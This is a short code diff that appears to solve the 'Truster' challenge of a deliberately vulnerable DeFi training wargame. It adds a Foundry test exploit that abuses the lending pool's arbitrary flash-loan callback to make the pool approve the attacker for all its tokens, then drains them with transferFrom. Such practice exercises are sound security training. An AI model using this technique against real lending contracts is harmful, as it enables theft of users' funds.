@@ -41,7 +41,14 @@ contract Truster is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        trusterLenderPool.flashLoan(
+            0,
+            address(attacker),
+            address(dvt),
+            abi.encodeWithSignature("approve(address,uint256)", address(attacker), TOKENS_IN_POOL)
+            );
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
         /** EXPLOIT END **/
         validation();
     }
